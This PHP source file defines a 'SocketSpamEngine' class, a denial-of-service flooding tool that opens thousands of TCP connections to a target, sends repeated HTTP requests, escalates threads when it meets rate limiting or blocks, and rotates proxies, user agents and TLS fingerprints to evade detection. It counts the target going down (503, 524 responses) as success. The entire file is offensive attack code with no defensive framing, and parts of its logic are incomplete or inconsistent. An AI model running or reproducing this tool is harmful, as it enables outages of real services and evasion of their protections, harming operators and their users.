<?php

require_once __DIR__ . '/../stealth_engine_class.php';
require_once __DIR__ . '/../client_profile_class.php';
require_once __DIR__ . '/../tls_profile_class.php';
require_once __DIR__ . '/../proxy_manager.php';

class SocketSpamEngine {
    private $config;
    private $stealthEngine;
    private $clientProfile;
    private $tlsProfile;
    private $proxyManager;
    private $connections = [];
    private $maxConnections = 1000;
    
    public function __construct($config = []) {
        $this->config = array_merge([
            'threads' => 500,
            'duration' => 3600,
            'max_connections_per_thread' => 50,
            'connection_timeout' => 30,
            'send_interval' => 0.1,
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'escalation_factor' => 1.5,
            'resistance_threshold' => 0.3
        ], $config);
        
        $this->maxConnections = $this->config['threads'] * $this->config['max_connections_per_thread'];
    }
    
    public function start($target, $groupId, $profile) {
        $this->logMessage("Starting Socket Spam attack on $target with group: $groupId");
        
        if ($this->config['stealth_enabled']) {
            $this->initializeStealth($groupId);
        }
        
        $startTime = time();
        $totalConnections = 0;
        $activeConnections = 0;
        $successCount = 0;
        $errorCodes = [];
        $currentThreads = $this->config['threads'];
        
        while (true) {
            if ($this->shouldStop($groupId)) {
                $this->logMessage("Manual stop signal received for group: $groupId");
                break;
            }
            
            if ($this->isSuccessConditionMet($target, $groupId, $errorCodes)) {
                $this->logMessage("Success condition met for target: $target in group: $groupId");
                break;
            }
            
            for ($thread = 0; $thread < $currentThreads; $thread++) {
                if (count($this->connections) < $this->maxConnections) {
                    $connection = $this->createSocketConnection($target);
                    if ($connection) {
                        $this->connections[] = $connection;
                        $totalConnections++;
                        $activeConnections++;
                    }
                }
                
                $this->maintainConnections($target);
                $this->sendSpamData($target);
                
                if ($this->config['stealth_enabled'] && $totalConnections % 100 === 0) {
                    $this->rotateStealthComponents();
                }
            }
            
            $this->cleanupDeadConnections();
            $activeConnections = count($this->connections);
            
            if ($this->shouldEscalate($errorCodes, $totalConnections)) {
                $currentThreads = min($currentThreads * $this->config['escalation_factor'], 20000);
                $this->logMessage("Escalated threads to $currentThreads for $target");
            }
            
            usleep(100000);
        }
        
        $this->closeAllConnections();
        
        return [
            'total_connections' => $totalConnections,
            'active_connections' => $activeConnections,
            'success_count' => $successCount,
            'error_codes' => $errorCodes,
            'duration' => time() - $startTime,
            'threads_used' => $currentThreads
        ];
    }
    
    private function createSocketConnection($target) {
        $parsedUrl = parse_url($target);
        $host = $parsedUrl['host'] ?? $target;
        $port = $parsedUrl['port'] ?? 80;
        
        if ($this->config['proxy_rotation'] && $this->proxyManager) {
            $proxy = $this->proxyManager->getCurrentProxy();
            if ($proxy) {
                $context = stream_context_create([
                    'http' => [
                        'proxy' => "tcp://{$proxy['ip']}:{$proxy['port']}",
                        'request_fulluri' => true,
                    ]
                ]);
                $socket = stream_socket_client("tcp://$host:$port", $errno, $errstr, $this->config['connection_timeout'], STREAM_CLIENT_CONNECT, $context);
            } else {
                $socket = stream_socket_client("tcp://$host:$port", $errno, $errstr, $this->config['connection_timeout']);
            }
        } else {
            $socket = stream_socket_client("tcp://$host:$port", $errno, $errstr, $this->config['connection_timeout']);
        }
        
        if (!$socket) {
            $this->logMessage("Failed to create socket connection to $host:$port - $errstr");
            return false;
        }
        
        stream_set_blocking($socket, false);
        stream_set_timeout($socket, $this->config['connection_timeout']);
        
        return [
            'socket' => $socket,
            'target' => $target,
            'created_at' => time(),
            'last_send' => 0,
            'bytes_sent' => 0
        ];
    }
    
    private function maintainConnections($target) {
        foreach ($this->connections as $key => $connection) {
            if (!is_resource($connection['socket']) || feof($connection['socket'])) {
                fclose($connection['socket']);
                unset($this->connections[$key]);
                continue;
            }
            
            if (time() - $connection['created_at'] > $this->config['connection_timeout']) {
                fclose($connection['socket']);
                unset($this->connections[$key]);
                continue;
            }
        }
        
        $this->connections = array_values($this->connections);
    }
    
    private function sendSpamData($target) {
        $spamData = $this->generateSpamPayload($target);
        
        foreach ($this->connections as &$connection) {
            if (time() - $connection['last_send'] >= $this->config['send_interval']) {
                $bytesSent = fwrite($connection['socket'], $spamData);
                if ($bytesSent !== false) {
                    $connection['bytes_sent'] += $bytesSent;
                    $connection['last_send'] = time();
                } else {
                    fclose($connection['socket']);
                    $connection['socket'] = null;
                }
            }
        }
    }
    
    private function generateSpamPayload($target) {
        $parsedUrl = parse_url($target);
        $host = $parsedUrl['host'] ?? $target;
        $path = $parsedUrl['path'] ?? '/';
        
        $userAgent = $this->clientProfile ? $this->clientProfile->getCurrentUserAgent() : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
        
        $headers = [
            "GET $path HTTP/1.1",
            "Host: $host",
            "User-Agent: $userAgent",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "Cache-Control: no-cache",
            "Pragma: no-cache"
        ];
        
        return implode("\r\n", $headers) . "\r\n\r\n";
    }
    
    private function cleanupDeadConnections() {
        foreach ($this->connections as $key => $connection) {
            if (!is_resource($connection['socket'])) {
                unset($this->connections[$key]);
            }
        }
        $this->connections = array_values($this->connections);
    }
    
    private function closeAllConnections() {
        foreach ($this->connections as $connection) {
            if (is_resource($connection['socket'])) {
                fclose($connection['socket']);
            }
        }
        $this->connections = [];
        $this->logMessage("Closed all socket connections");
    }
    
    private function shouldEscalate($errorCodes, $requestCount) {
        if ($requestCount < 100) return false;
        
        $blockCodes = [403, 429, 503];
        $blockCount = 0;
        
        foreach ($blockCodes as $code) {
            $blockCount += $errorCodes[$code] ?? 0;
        }
        
        $blockRate = $blockCount / $requestCount;
        return $blockRate > $this->config['resistance_threshold'];
    }
    
    private function initializeStealth($groupId) {
        $this->stealthEngine = new StealthEngine([
            'session_id' => "socket_spam_$groupId",
            'stealth_level' => 'maximum',
            'rotation_interval' => 20
        ]);
        
        $this->clientProfile = new ClientProfile();
        $this->tlsProfile = new TLSProfile();
        $this->proxyManager = new ProxyManager();
        
        $this->logMessage("Initialized stealth components for Socket Spam group: $groupId");
    }
    
    private function rotateStealthComponents() {
        if ($this->stealthEngine) {
            $rotations = $this->stealthEngine->performEvolutionCycle();
            $this->logMessage("Stealth evolution cycle completed: " . implode(', ', $rotations));
        } else {
            if ($this->config['proxy_rotation']) {
                $this->proxyManager->rotateProxy();
            }
            if ($this->config['ua_rotation']) {
                $this->clientProfile->rotateUserAgent();
            }
        }
    }
    
    private function shouldStop($groupId) {
        $stopFile = "/tmp/stop_signal_$groupId.flag";
        return file_exists($stopFile);
    }
    
    private function isSuccessConditionMet($target, $groupId, $errorCodes) {
        if (empty($errorCodes)) return false;
        
        $totalRequests = array_sum($errorCodes);
        if ($totalRequests < 100) return false;
        
        $successCodes = [404, 410, 503, 524];
        $successCount = 0;
        
        foreach ($successCodes as $code) {
            $successCount += $errorCodes[$code] ?? 0;
        }
        
        $successRate = $successCount / $totalRequests;
        
        if ($successRate >= 0.75) {
            $statusFile = "/tmp/success_status_$groupId.json";
            $status = [
                'target' => $target,
                'success_rate' => $successRate,
                'total_requests' => $totalRequests,
                'success_count' => $successCount,
                'timestamp' => time(),
                'condition_met' => true
            ];
            file_put_contents($statusFile, json_encode($status));
            return true;
        }
        
        return false;
    }
    
    private function logMessage($message) {
        $logFile = './logs/backend.log';
        $logDir = dirname($logFile);
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp] SOCKET_SPAM_ENGINE: $message" . PHP_EOL;
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
}
